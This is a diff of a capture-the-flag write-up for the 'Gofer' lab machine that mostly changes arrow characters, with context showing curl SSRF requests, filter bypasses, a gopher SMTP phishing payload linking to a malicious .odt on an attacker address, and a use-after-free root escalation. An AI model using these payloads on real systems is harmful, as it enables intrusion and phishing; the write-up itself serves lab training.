@@ -37,7 +37,7 @@ Service Info: Host: gofer.htb
 
 We can add this domain to our `/etc/hosts` file.&#x20;
 
-### Web Enumeration --> LFI
+### Web Enumeration -> LFI
 
 Port 80 hosted a typical corporate site:
 
@@ -73,7 +73,7 @@ Weak credentials don't work at all. I tested a few common directories with diffe
 
 ```
 $ curl -X POST http://proxy.gofer.htb/index.php
-<!-- Welcome to Gofer proxy -->
+<!-- Welcome to Gofer proxy ->
 <html><body>Missing URL parameter !</body></html>
 ```
 
@@ -81,10 +81,10 @@ Testing it a bit more reveals where the URL parameter can be specified:
 
 ```
 $ curl -X POST -d 'URL=http://10.10.14.42' http://proxy.gofer.htb/index.php
-<!-- Welcome to Gofer proxy -->
+<!-- Welcome to Gofer proxy ->
 <html><body>Missing URL parameter !</body></html>
 $ curl -X POST http://proxy.gofer.htb/index.php?url=http://10.10.14.42
-<!-- Welcome to Gofer proxy -->
+<!-- Welcome to Gofer proxy ->
 <!DOCTYPE HTML>
 <html lang="en">
 <head>
@@ -104,7 +104,7 @@ So we have SSRF on this machine with this `url` parameter. I attempted some LFI 
 
 ```
 $ curl -X POST http://proxy.gofer.htb/index.php?url=file:///etc/passwd
-<!-- Welcome to Gofer proxy -->
+<!-- Welcome to Gofer proxy ->
 <html><body>Blacklisted keyword: file:// !</body></html>
 ```
 
@@ -112,7 +112,7 @@ A bit more testing by removing `/` characters eventually works! This tells me th
 
 <figure><img src="../../.gitbook/assets/image (4125).png" alt=""><figcaption></figcaption></figure>
 
-### SMB --> Phishing Download
+### SMB -> Phishing Download
 
 Port 445 is open on this Linux host, and it shows us one share.&#x20;
 
@@ -222,7 +222,7 @@ This payload almost works, except for the fact that the IP address is flagged:
 {% code overflow="wrap" %}
 ```
 $ curl -X 'POST' 'http://proxy.gofer.htb/index.php?url=gopher://127.0.0.1:25/_MAIL%20FROM:iamanidiot%40gofer.htb%0ARCPT%20To:jhudson%40gofer.htb%0ADATA%0AFrom:iamanidiot%40gofer.htb%0ASubject:hello%20testing%0AMessage:http://10.10.14.42/bad.odt%0A'
-<!-- Welcome to Gofer proxy -->
+<!-- Welcome to Gofer proxy ->
 <html><body>Blacklisted keyword: /127 !</body></html>
 ```
 {% endcode %}
@@ -232,7 +232,7 @@ We can specify the IP address in decimal mode in order to bypass this.&#x20;
 {% code overflow="wrap" %}
 ```
 $ curl -X 'POST' 'http://proxy.gofer.htb/index.php?url=gopher://2130706433:25/_MAIL%20FROM:iamanidiot%40gofer.htb%0ARCPT%20To:jhudson%40gofer.htb%0ADATA%0AFrom:iamanidiot%40gofer.htb%0ASubject:hello%20testing%0AMessage:http://10.10.14.42/bad.odt%0A'
-<!-- Welcome to Gofer proxy -->
+<!-- Welcome to Gofer proxy ->
 ```
 {% endcode %}
 
@@ -286,7 +286,7 @@ Since there were some quotes I was lazy to deal with, I sent it in Burp and got 
 
 We would also get hits on our HTTP server.&#x20;
 
-### Document Creation --> RCE
+### Document Creation -> RCE
 
 I followed this to create my own malicious `.odt` file:
 
@@ -322,7 +322,7 @@ We can then `su` to `tbuckley`, who is part of the `dev` group:
 
 <figure><img src="../../.gitbook/assets/image (4130).png" alt=""><figcaption></figcaption></figure>
 
-### Notes SUID --> Reverse Engineering
+### Notes SUID -> Reverse Engineering
 
 I ran a `linpeas.sh` it picked up on this weird SUID binary:
 
@@ -392,12 +392,12 @@ This part of the code checks whether the role of the user has been set to `admin
 
 To exploit this, we need to:
 
-* Create a user --> Creates the allocated block of 40 bytes.
-* Delete the user --> Creates a dangling pointer to our first user created.&#x20;
-* Write a note --> Using the notes function, we can write 24 characters for the username, and the have `admin` after the 24th byte to escalate privileges, which looks something like this: `111111111111111111111111admin`.&#x20;
+* Create a user -> Creates the allocated block of 40 bytes.
+* Delete the user -> Creates a dangling pointer to our first user created.&#x20;
+* Write a note -> Using the notes function, we can write 24 characters for the username, and the have `admin` after the 24th byte to escalate privileges, which looks something like this: `111111111111111111111111admin`.&#x20;
 * Use option 8 to execute our malicious `tar` binary.
 
-### Exploit --> Root
+### Exploit -> Root
 
 First, let's create our `tar` binary:
 
